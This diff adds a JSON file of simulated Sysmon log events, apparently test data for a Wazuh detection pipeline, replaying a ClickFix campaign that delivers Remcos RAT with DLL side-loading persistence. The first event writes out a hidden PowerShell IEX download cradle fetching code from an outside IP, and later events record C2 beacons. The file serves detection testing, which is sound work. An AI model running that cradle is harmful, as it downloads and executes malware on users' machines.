@@ -1,0 +1,216 @@
+{
+  "_metadata": {
+    "attack_id": "T1547.001",
+    "variation": "001",
+    "name": "SmartApeSG ClickFix Remcos RAT Persistence",
+    "description": "Simulates SmartApeSG campaign using ClickFix technique to deliver Remcos RAT with DLL side-loading persistence via shotcut.exe",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "persistence",
+    "source_url": "https://www.malware-traffic-analysis.net/2026/01/22/index.html",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell downloads payload from ClickFix infrastructure",
+      "sequence": 1,
+      "timestamp": "2026-02-03T14:00:00.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: PowerShell ClickFix download cradle",
+          "id": "92151",
+          "mitre": {
+            "id": ["T1059.001", "T1105"],
+            "tactic": ["Execution", "Command and Control"],
+            "technique": ["PowerShell", "Ingress Tool Transfer"]
+          },
+          "groups": ["sysmon", "sysmon_event1", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1700000004.000001",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 14:00:00.000",
+              "processGuid": "{4DC16835-DA1B-65B0-H100-000000001500}",
+              "processId": "8456",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -w hidden -c \"IEX(IWR -Uri 'http://98.142.251.63/con' -UseBasicParsing)\"",
+              "currentDirectory": "C:\\Users\\victim\\",
+              "user": "CORP\\victim",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{4DC16835-DA0A-65B0-H000-000000001500}",
+              "parentProcessId": "4892",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Network connection to ClickFix C2",
+      "sequence": 2,
+      "timestamp": "2026-02-03T14:00:05.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 3: Connection to SmartApeSG C2 infrastructure",
+          "id": "92153",
+          "mitre": {
+            "id": ["T1071.001"],
+            "tactic": ["Command and Control"],
+            "technique": ["Application Layer Protocol: Web Protocols"]
+          },
+          "groups": ["sysmon", "sysmon_event3", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1700000004.000002",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 14:00:05.000",
+              "processGuid": "{4DC16835-DA1B-65B0-H100-000000001500}",
+              "processId": "8456",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "user": "CORP\\victim",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "10.1.0.20",
+              "sourcePort": "51234",
+              "destinationIp": "98.142.251.63",
+              "destinationPort": "80"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1071.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Remcos RAT persistence via shotcut.exe side-loading",
+      "sequence": 3,
+      "timestamp": "2026-02-03T14:00:30.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Remcos RAT persistence via shotcut.exe",
+          "id": "92151",
+          "mitre": {
+            "id": ["T1547.001", "T1574.002"],
+            "tactic": ["Persistence", "Defense Evasion"],
+            "technique": ["Registry Run Keys", "DLL Side-Loading"]
+          },
+          "groups": ["sysmon", "sysmon_event1", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1700000004.000003",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 14:00:30.000",
+              "processGuid": "{4DC16835-DA3D-65B0-H300-000000001500}",
+              "processId": "9156",
+              "image": "C:\\Users\\victim\\AppData\\Local\\2120206\\shotcut.exe",
+              "commandLine": "\"C:\\Users\\victim\\AppData\\Local\\2120206\\shotcut.exe\"",
+              "currentDirectory": "C:\\Users\\victim\\AppData\\Local\\2120206\\",
+              "user": "CORP\\victim",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=0f7d358f3a96d7f185be26a349ec16dfb75bde1bda8312945931d69b472d950e",
+              "parentProcessGuid": "{4DC16835-0000-0000-0000-000000000000}",
+              "parentProcessId": "0",
+              "parentImage": "System"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1547.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Remcos RAT C2 beacon",
+      "sequence": 4,
+      "timestamp": "2026-02-03T14:01:00.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 3: Remcos RAT C2 connection",
+          "id": "92153",
+          "mitre": {
+            "id": ["T1071.001"],
+            "tactic": ["Command and Control"],
+            "technique": ["Application Layer Protocol: Web Protocols"]
+          },
+          "groups": ["sysmon", "sysmon_event3", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1700000004.000004",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 14:01:00.000",
+              "processGuid": "{4DC16835-DA3D-65B0-H300-000000001500}",
+              "processId": "9156",
+              "image": "C:\\Users\\victim\\AppData\\Local\\2120206\\shotcut.exe",
+              "user": "CORP\\victim",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "10.1.0.20",
+              "sourcePort": "51456",
+              "destinationIp": "109.172.91.23",
+              "destinationPort": "443"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1071.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    }
+  ]
+}
